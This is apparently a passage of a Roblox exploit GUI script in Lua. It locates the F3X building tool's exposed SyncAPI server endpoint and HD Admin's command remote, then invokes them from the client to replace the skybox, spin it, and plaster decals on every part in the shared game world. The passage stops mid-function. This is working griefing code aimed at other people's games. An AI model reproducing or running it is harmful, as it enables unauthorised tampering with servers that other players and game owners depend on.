G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["86"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["Text"] = [[Floating pad]];
G2L["86"]["Position"] = UDim2.new(0.7069, 0, 0.02576, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["87"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["88"] = Instance.new("TextButton", G2L["78"]);
G2L["88"]["TextWrapped"] = true;
G2L["88"]["BorderSizePixel"] = 4;
G2L["88"]["TextSize"] = 14;
G2L["88"]["TextScaled"] = true;
G2L["88"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["88"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["Text"] = [[Disco characters]];
G2L["88"]["Position"] = UDim2.new(0.00965, 0, 0.18379, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["88"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["8a"] = Instance.new("TextButton", G2L["78"]);
G2L["8a"]["TextWrapped"] = true;
G2L["8a"]["BorderSizePixel"] = 4;
G2L["8a"]["TextSize"] = 14;
G2L["8a"]["TextScaled"] = true;
G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["Text"] = [[Animation]];
G2L["8a"]["Position"] = UDim2.new(0.12447, 0, 0.18192, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["8b"] = Instance.new("LocalScript", G2L["8a"]);



-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton
G2L["8c"] = Instance.new("TextButton", G2L["78"]);
G2L["8c"]["TextWrapped"] = true;
G2L["8c"]["BorderSizePixel"] = 4;
G2L["8c"]["TextSize"] = 14;
G2L["8c"]["TextScaled"] = true;
G2L["8c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8c"]["Size"] = UDim2.new(0, 67, 0, 50);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["Text"] = [[Animation all]];
G2L["8c"]["Position"] = UDim2.new(0.82064, 0, 0.02576, 0);


-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
G2L["8d"] = Instance.new("LocalScript", G2L["8c"]);



-- StarterGui.ScreenGui.Frame.LocalScript
G2L["8e"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Frame.Home.ImageLabel.LocalScript
local function C_b()
local script = G2L["b"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local imageLabel = script.Parent
	
	local thumbnail, _ = Players:GetUserThumbnailAsync(
		player.UserId,
		Enum.ThumbnailType.HeadShot,
		Enum.ThumbnailSize.Size420x420
	)
	
	imageLabel.Image = thumbnail
end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Frame.Home.TextLabel.LocalScript
local function C_d()
local script = G2L["d"];
	local RunService = game:GetService("RunService")
	local textLabel = script.Parent
	
	
	local frameCount = 0
	local nextUpdate = 0
	
	RunService.RenderStepped:Connect(function()
		frameCount += 1
	
		
		if tick() >= nextUpdate then
			textLabel.Text = "FPS: " .. frameCount
	
			
			frameCount = 0
			nextUpdate = tick() + 1
		end
	end)
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Frame.Home.TextLabel.LocalScript
local function C_f()
local script = G2L["f"];
	local RunService = game:GetService("RunService")
	local textLabel = script.Parent
	
	local function updateClock()
		
		
		local formatString = "%A, %X" 
	
		local currentTime = os.date(formatString)
		textLabel.Text = currentTime
	end
	
	
	updateClock()
	
	
	while true do
		updateClock()
		task.wait(1)
	end
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_12()
local script = G2L["12"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent["Home"].Visible=true
		script.Parent.Parent["Skybox/decals"].Visible=false
		script.Parent.Parent["F3X Scripts"].Visible=false
		script.Parent.Parent["Player Scripts"].Visible=false
	end)
end;
task.spawn(C_12);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_15()
local script = G2L["15"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent["Home"].Visible=false
		script.Parent.Parent["Skybox/decals"].Visible=true
		script.Parent.Parent["F3X Scripts"].Visible=false
		script.Parent.Parent["Player Scripts"].Visible=false
	end)
end;
task.spawn(C_15);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_18()
local script = G2L["18"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent["Home"].Visible=false
		script.Parent.Parent["Skybox/decals"].Visible=false
		script.Parent.Parent["F3X Scripts"].Visible=true
		script.Parent.Parent["Player Scripts"].Visible=false
	end)
end;
task.spawn(C_18);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_1b()
local script = G2L["1b"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent["Home"].Visible=false
		script.Parent.Parent["Skybox/decals"].Visible=false
		script.Parent.Parent["F3X Scripts"].Visible=false
		script.Parent.Parent["Player Scripts"].Visible=true
	end)
end;
task.spawn(C_1b);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_1f()
local script = G2L["1f"];
	script.Parent.MouseButton1Click:Connect(function()
		local Id = script.Parent.Parent.decal.Text
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
		function reflect(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Reflectance"] = int
					}
				}
			}
			_(args)
		end
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function MeshColor(part,color)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["VertexColor"] = color
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function Setmate(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
	
			local function findBuildingTools()
				local player = game:GetService("Players").LocalPlayer
	
				for _, item in ipairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				return nil
			end
			local buildingTools = findBuildingTools()
			if not buildingTools then
				warn("btools not found")
				return
			end
	
			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
			if not serverEndpoint then
				warn("btools not found")
				return
			end
	
			local skyInstance = workspace.Terrain:FindFirstChild("Sky") or workspace:FindFirstChild("Sky")
			if not skyInstance then
	
				print"ok"
			end
			spawn(function()
				DestroyPart(skyInstance)
			end)
			local success, result
			if serverEndpoint:IsA("RemoteFunction") then
				success, result = pcall(function()
					return serverEndpoint:InvokeServer(unpack(args))
				end)
			else
	
				serverEndpoint:FireServer(unpack(args))
				success = true
			end
	
			if success then
	
				print"yay"
	
			end
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			mhm = CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,-5,0)
			v = remote:InvokeServer("CreatePart","Normal",mhm,workspace.Terrain)
			spawn(function()
				rq:InvokeServer(";unfog ;fogcolor black ;time 6")
			end)
			spawn(function()
				SetName(v,"Sky")
			end)
			spawn(function()
				AddMesh(v)
			end)
			spawn(function()
				SetMesh(v,"111891702759441")
			end)
			spawn(function()
				MeshColor(v,vector.create(4.5,4.5,4.5))
			end)
			spawn(function()
				SetTexture(v,id)
			end)
			spawn(function()
				MeshResize(v,Vector3.new(100000,100000,100000))
			end)
			spawn(function()
				SetLocked(v,true)
			end)
		end
	Sky(Id)
	end)
end;
task.spawn(C_1f);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_22()
local script = G2L["22"];
	script.Parent.MouseButton1Click:Connect(function()
		local Id = script.Parent.Parent.decal.Text
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(6000, 6000, 6000))
					SetLocked(v,true)
				end
			end
		end
		Sky(Id)
	
	end)
end;
task.spawn(C_22);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_25()
local script = G2L["25"];
	script.Parent.MouseButton1Click:Connect(function()
		local Id = script.Parent.Parent.decal.Text
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam(Id)
	
	end)
end;
task.spawn(C_25);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_28()
local script = G2L["28"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
	
		local tool
	
		for i,v in player:GetDescendants() do
	
			if v.Name == "SyncAPI" then
	
				tool = v.Parent
	
				break
	
			end
	
		end
	
		for i,v in game.ReplicatedStorage:GetDescendants() do
	
			if v.Name == "SyncAPI" then
	
				tool = v.Parent
	
				break
	
			end
	
		end
	
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
	
			remote:InvokeServer(unpack(args))
	
		end
	
		function MovePart(part,cf)
	
			local args = {[1]="SyncMove",[2]={[1]={["Part"]=part,["CFrame"]=cf}}}
	
			_(args)
	
		end
	
		local skyboxPart
	
		for i,v in game.Workspace:GetDescendants() do
	
			if v:IsA("BasePart") and v:FindFirstChildWhichIsA("SpecialMesh") then
	
				local mesh = v:FindFirstChildWhichIsA("SpecialMesh")
	
				if mesh.MeshId == "rbxassetid://111891702759441" then
	
					skyboxPart = v
	
					break
	
				end
	
			end
	
		end
	
		if skyboxPart then
	
			local originalPos = skyboxPart.CFrame.Position
	
			local RunService = game:GetService("RunService")
	
			local angleX = 0
	
			local angleY = 0
	
			local angleZ = 0
	
	
	
			RunService.Heartbeat:Connect(function(dt)
	
				pcall(function()
	
					angleX = angleX + (math.random(67, 80) * dt)
	
					angleY = angleY + (math.random(67, 80) * dt)
	
					angleZ = angleZ + (math.random(67, 80) * dt)
	
	
	
					if angleX >= 360 then angleX = angleX - 360 end
	
					if angleY >= 360 then angleY = angleY - 360 end
	
					if angleZ >= 360 then angleZ = angleZ - 360 end
	
	
	
					MovePart(skyboxPart, CFrame.new(originalPos) * CFrame.Angles(math.rad(angleX), math.rad(angleY), math.rad(angleZ)))
	
				end)
	
			end)
	
		end
	
	end)
end;
task.spawn(C_28);
-- StarterGui.ScreenGui.Frame.Skybox/decals.TextButton.LocalScript
local function C_2b()
local script = G2L["2b"];
	script.Parent.MouseButton1Click:Connect(function()
		local Id = script.Parent.Parent.decal.Text
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function SetMate(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		function decal(root,id)
			spawn(function()
				spawn(function()
					SetLocked(root,false)
				end)
				spawn(function()
					SetTrans(root,0)
				end)
				spawn(function()
					SetMate(root,Enum.Material.Plastic)
				end)
				spawn(function()
					SpawnDecal(root,Enum.NormalId.Front)
				end)
				spawn(function()
					AddDecal(root,id,Enum.NormalId.Front)
				end)
				spawn(function()
					SpawnDecal(root,Enum.NormalId.Back)
				end)
				spawn(function()
					AddDecal(root,id,Enum.NormalId.Back)
				end)
				spawn(function()
					SpawnDecal(root,Enum.NormalId.Right)
				end)
				spawn(function()
					AddDecal(root,id,Enum.NormalId.Right)
				end)
				spawn(function()
					SpawnDecal(root,Enum.NormalId.Left)
				end)
				spawn(function()
					AddDecal(root,id,Enum.NormalId.Left)
				end)
				spawn(function()
					SpawnDecal(root,Enum.NormalId.Bottom)
				end)
				spawn(function()
					AddDecal(root,id,Enum.NormalId.Bottom)
				end)
				spawn(function()
					SpawnDecal(root,Enum.NormalId.Top)
				end)
				spawn(function()
					AddDecal(root,id,Enum.NormalId.Top)
				end)
			end)
		end
		function asdf(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					decal(v,id)	
				end
			end 
